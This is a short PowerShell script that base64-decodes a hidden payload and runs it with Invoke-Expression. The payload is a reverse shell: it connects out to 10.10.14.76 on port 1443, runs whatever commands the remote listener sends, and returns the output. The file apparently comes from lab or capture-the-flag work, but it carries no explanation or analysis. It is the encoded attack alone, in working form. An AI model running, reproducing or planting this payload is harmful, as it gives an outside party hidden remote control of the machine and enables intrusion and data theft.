$base64EncodedString = "JExIT1NUID0gIjEwLjEwLjE0Ljc2IjsgJExQT1JUID0gMTQ0MzsgJFRDUENsaWVudCA9IE5ldy1PYmplY3QgTmV0LlNvY2tldHMuVENQQ2xpZW50KCRMSE9TVCwgJExQT1JUKTsgJE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOyAkU3RyZWFtUmVhZGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoJE5ldHdvcmtTdHJlYW0pOyAkU3RyZWFtV3JpdGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJE5ldHdvcmtTdHJlYW0pOyAkU3RyZWFtV3JpdGVyLkF1dG9GbHVzaCA9ICR0cnVlOyAkQnVmZmVyID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdIDEwMjQ7IHdoaWxlICgkVENQQ2xpZW50LkNvbm5lY3RlZCkgeyB3aGlsZSAoJE5ldHdvcmtTdHJlYW0uRGF0YUF2YWlsYWJsZSkgeyAkUmF3RGF0YSA9ICROZXR3b3JrU3RyZWFtLlJlYWQoJEJ1ZmZlciwgMCwgJEJ1ZmZlci5MZW5ndGgpOyAkQ29kZSA9IChbdGV4dC5lbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkQnVmZmVyLCAwLCAkUmF3RGF0YSAtMSkgfTsgaWYgKCRUQ1BDbGllbnQuQ29ubmVjdGVkIC1hbmQgJENvZGUuTGVuZ3RoIC1ndCAxKSB7ICRPdXRwdXQgPSB0cnkgeyBJbnZva2UtRXhwcmVzc2lvbiAoJENvZGUpIDI+JjEgfSBjYXRjaCB7ICRfIH07ICRTdHJlYW1Xcml0ZXIuV3JpdGUoIiRPdXRwdXRgbiIpOyAkQ29kZSA9ICRudWxsIH0gfTsgJFRDUENsaWVudC5DbG9zZSgpOyAkTmV0d29ya1N0cmVhbS5DbG9zZSgpOyAkU3RyZWFtUmVhZGVyLkNsb3NlKCk7ICRTdHJlYW1Xcml0ZXIuQ2xvc2UoKQo="
$decodedCommand = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64EncodedString))
Invoke-Expression $decodedCommand